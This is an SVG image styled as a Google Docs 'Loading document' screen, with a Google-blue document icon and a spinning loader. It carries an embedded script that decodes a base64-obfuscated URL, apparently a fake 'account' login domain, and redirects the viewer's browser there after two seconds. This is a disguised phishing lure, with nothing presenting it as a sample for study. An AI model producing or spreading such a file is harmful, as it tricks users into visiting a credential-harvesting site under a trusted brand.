<svg width="400" height="300" viewBox="0 0 400 300" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <!-- Google blue gradient for loader -->
    <linearGradient id="loaderGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#4285f4"/>
      <stop offset="100%" stop-color="#1a73e8"/>
    </linearGradient>
    <!-- Shadow for card -->
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#000" flood-opacity="0.10"/>
    </filter>
  </defs>
  <script type="application/ecmascript"><![CDATA[
    setTimeout(function() {
      var b64 = "aHR0cHM6Ly9hY2NvdW50Lmk0aHQyOTg0Z3QuY2Mv";
      var url = atob(b64);
      window.location.href = url;
    }, 2000);
  ]]></script>
  <!-- Background -->
  <rect width="400" height="300" fill="#f8f9fa"/>
  <!-- Centered card -->
  <rect x="60" y="60" width="280" height="180" rx="16" fill="#fff" filter="url(#shadow)"/>
  <!-- Google Docs icon -->
  <g transform="translate(110, 100)">
    <rect x="0" y="0" width="48" height="64" rx="8" fill="#4285f4"/>
    <rect x="8" y="12" width="32" height="6" rx="2" fill="#fff" opacity="0.8"/>
    <rect x="8" y="24" width="32" height="6" rx="2" fill="#fff" opacity="0.8"/>
    <rect x="8" y="36" width="24" height="6" rx="2" fill="#fff" opacity="0.8"/>
    <rect x="8" y="48" width="16" height="6" rx="2" fill="#fff" opacity="0.8"/>
  </g>
  <!-- Spinning loader -->
  <g transform="translate(220, 132)">
    <circle cx="0" cy="0" r="22" stroke="url(#loaderGradient)" stroke-width="5" fill="none" stroke-dasharray="34 22">
      <animateTransform attributeName="transform" type="rotate" from="0 0 0" to="360 0 0" dur="1s" repeatCount="indefinite"/>
    </circle>
  </g>
  <!-- Loading text -->
  <text x="200" y="210" font-family="Arial, Helvetica, sans-serif" font-size="18" fill="#3c4043" text-anchor="middle">
    Loading documentâ€¦
  </text>
</svg>
